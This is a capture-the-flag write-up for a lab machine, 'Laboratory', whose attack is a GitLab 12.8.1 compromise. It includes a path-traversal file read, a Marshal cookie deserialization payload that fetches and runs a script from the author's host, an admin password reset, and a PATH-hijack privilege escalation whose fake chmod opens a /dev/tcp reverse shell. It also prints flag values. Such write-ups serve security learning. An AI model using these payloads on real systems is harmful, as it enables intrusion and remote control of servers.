# Laboratory 

export IP=10.10.10.216

## Solution 

Lets start with an nmap scan ... <br>

```
cmd: nmap -sC -sV -oN nmap/initial $IP

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1

```

We can already see some things
```
subdomain: laboratory.htb
git: git.laboratory.htb 
```

visiting the website (port 80) we can see several things 
- Invalid certificate (https) 
- Some users (on the bottom feedbacks):
  - Dexter (CEO)
  - Dee Dee (Uncertain)
  - Anonymous (hacking group) <- maybve there's a service with the anonymous account available

Lets issue an nmap all ports on the side... UPDATE: Nothing more was found<br>

We can also access <b> git.laboratory.htb </b>  and we can either login or register <br>

to register we need to specify a <b> w@laboratory.htb </b> email <br>

Version: GitLab Community Edition 12.8.1<br>

I found an exploit to Arbitrary File read but could not make it execute, so i'll do it manually ! <br>

It worked!

```
create proj1
create proj2

create new issue on proj1 with message: ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)

Move the issue to the proj2 and the file is accessible!!
```

Now, with the LFI, we need to somehow perform an RCE <br>

I found something that will work. It was posted in the current used LFI vulnerability disclosure a method to achieve RCE with it <br>

It is possible because this version of GitLab uses unsafe Hybrind cookies serializer <br>

```
1 - Read secret_key_base (/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
2 - Use experimentation_subject_id cookie with a Marshalled payload.
```

Secrets.yml content
```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)

```

Cookie payload
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `echo waza boss > /tmp/waza` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

Since i was getting some errors due to the Marshalling i went ahead and searched for a GitLab docker for the version. <br>

```
docker pull gitlab/gitlab-ce:12.8.1-ce.0

sudo docker run --detach \
  --hostname gitlab.wazadocker.com \
  --publish 443:443 --publish 80:80 --publish 2222:22 \
  --name gitlab \
  --restart unless-stopped \
  --volume $GITLAB_HOME/config:/etc/gitlab \
  --volume $GITLAB_HOME/logs:/var/log/gitlab \
  --volume $GITLAB_HOME/data:/var/opt/gitlab \
  gitlab/gitlab-ce:12.8.1-ce.0
```

i've never used docker, so i wasted some time understanding and installing everything.... <br>

I needed to change the file <b> /etc/gitlab/gitlab-secrets.json </b> by inserting the target machine secret_key_base (and the reconfigure the gitlab) <br> 

After reconfigured, launch the gitlab rails console
```
gitlab-rails console -e production
```

I experimented multiple payloads with different outcomes:
- Create file /tmp/waza and access via LFI (no success)
- Download a file from my machine python http server (worked)

This means that it has some restriction with the /tmp/ folder...<br>

Exploit:
- Bash script that makes a reverse shell
  
Payload:
- wget the exploit
- chmod +x 
- run 
- (fingers crossed)


Cookie payload generator (rails console)
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `wget 'http://10.10.14.195:8000/w_r.sh' && chmod +x w_r.sh && ./w_r.sh` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

Curl cmd (with payload)
```
curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAYUjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCAnaHR0cDovLzEwLjEwLjE0LjE5NTo4MDAwL3dfcjMuc2gnICYmIGNobW9kICt4IHdfcjMuc2ggJiYgLi93X3IzLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--e6baef9f09992f8fd0373e5656e08aaacc7416fe"
```

And we did it!!!

```
whoami && id

git
uid=998(git) gid=998(git) groups=998(git)
```

Now we need to somehow privesc to some user... <br>

Lets not forget about the initial website... <br>

I cannot find the folders and files that the website displays, maybe it is in a different machine/docker??? <br>

Things tried:
- Found an ssh key for the git user and tried on laboratory.htb (no success)

I was manually enumerating, lets run linpeas in this <br>

After linpeas run (interesting things)

```
Inside docker (as i suspected, can i break out to the host??)

[+] Unexpected folders in root
/assets

-rw-r----- 1 root git 988 Jul  2 18:01 /var/opt/gitlab/gitlab-shell/config.yml(nothing)
-rw-r----- 1 root git 525 Jul  2 18:01 /var/opt/gitlab/gitlab-rails/etc/database.yml
(might have a user for postgres)

-rw-r----- 1 root git 22583 Jul  2 18:01 /var/opt/gitlab/gitlab-rails/etc/gitlab.yml (nothing)
-rw-r----- 1 root git 781 Jul  2 18:01 /var/opt/gitlab/gitaly/config.toml
(prometheus_listen_addr = 'localhost:9236')

-rw-r----- 1 root git 70 Jul  2 18:02 /var/opt/gitlab/gitlab-workhorse/config.toml
(URL = "unix:/var/opt/gitlab/redis/redis.socket"
Password = "")

-rwxr-xr-x 1 root root 3726 Feb 24  2020 /opt/gitlab/bin/gitlab-backup (nothing)
-rw-r--r-- 1 root root 8459 Feb 24  2020 /opt/gitlab/embedded/service/gitlab-rails/lib/tasks/gitlab/backup.rake (nothing)

-rw-r--r-- 1 root root 5671 Feb 24  2020 /opt/gitlab/embedded/lib/python3.7/sqlite3/test/backup.py (nothing)
-rw-r--r-- 1 root root 2188 Aug 31  2015 /etc/bash.bashrc (nothing)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc (nothing)
-rw-r--r-- 1 root root 655 Jul 12  2019 /etc/skel/.profile
-rw-r--r-- 1 root root 3106 Sep 30  2019 /usr/share/base-files/dot.bashrc

/var/log/gitlab/gitlab-rails/production.log (reset password)
Dexter@laboratory.htb (found in logs)

/opt/gitlab/embedded/postgresql/11/bin/pg_basebackup 
/var/log/gitlab/gitlab-rails/production_json.log
/var/log/gitlab/gitlab-rails/production.log
```

Since i found nothing, lets try to reset the password for <b> Dexter </b> <br>

I found that is possible to modify the accounts password without inserting the old one
```
user = User.find_by(email: 'Dexter@laboratory.htb') <- SHOULD BE THIS, BUT IT IS NOT
user = User.find_by(email: 'admin@example.com') <- this works (default creds email) 
user.password = 'secret_pass'
user.password_confirmation = 'secret_pass'
user.save!
```

After login, we have 2 repos:
- SecureWebsite (Description: 100% unhackable HTML&CSS based website)
- SecureDocker (Description: CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I'll figure that out later.)

It is visible that the SecureWebsite has an issue posted
```
Title: Website doesn't work
Msg: Hi, I cloned this website and when I try to launch my server it gives a HTTP 418 response. How to fix please?

User: Seven
```

From google:
```
418 I'm a teapot (like an honeypot, meaning it has nothing relevant in the website content )
```

we have something interesting in the SecureDocker repo
```
File: todo.txt
------------------------------------------
TODO: Look into "docker compose"
TODO: Permanently ban DeeDee from lab
-----------------------------------
File: .ssh/id_rsa (might work for the host machine)
```

The ssh key (id_rsa) worked ! but needed 2 new lines at the end (what a troll) <br>
```
whoami

dexter
uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)

cat ~/user.txt
FLAG: e77641fc63f0b49515e1bae920140f32
```

I noticed one thing on linpeas. The nano editor was used to search things in some particular file to allow root login via ssh with password (apparently)
```
cat .local/share/nano/search_history 
challenge
permitroot
password
```

But it is contradicted with the config file
```
cmd: cat /etc/ssh/sshd_config | grep Permit

PermitRootLogin prohibit-password
```

This means that we cannot ssh to root with password (only with ssh) and cannot <b> su </b> to it... we need the private key <br>

One thing that i noticed from the files in the repo is that dexter has in his authorized_keys the root public key... they might be connected somehow  <br>

After countless time, i decided to ask for a nudge since i was not leading anywhere to privesc... The nudge was to run LinEnum... It was also discovered by linpeas but in LinEnum it was more evident to spot ! <br>

```
-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security
```

When i run it, nothing happen.... Doing strace and ltrace we can see that it tries to change permissions for the docker binary but fails... <br>

After a longggggggggg freakin time, i asked someone for a nudge and, for the fuck sake, i completely overlooked the ltrace comand reference to the path env variable by using <b> chmod </b>  with a relative path .... <br>

We just need to change the start of the path variable to a user writable folder that contains a chmod binary (a fake chmod which give us root priveleges) <br>

Setup
```
mkdir /tmp/w
touch /tmp/w/dummy
chmod +x /tmp/w/dummy
mv /tmp/w/dummy /tmp/w/chmod

export PATH="/tmp/w:$PATH"

echo "#!/bin/bash" > /tmp/w/chmod
echo "bash -i >& /dev/tcp/10.10.14.195/1414 0>&1" >> /tmp/w/chmod
-----------------------------------------------------------------
On my machine: nc -lvvnp 1414
-----------------------------------------------------------------
On remote: /usr/local/bin/docker-security
```

Anddddd voila, so freaking easy ! but a clear mind opening to be more patient and pay more attention to details.
```
whoami && id
root
uid=0(root) gid=0(root) groups=0(root),1000(dexter)

cat /root/root.txt
FLAG: 0e03db8056aa643f6a24c99a91456689
```
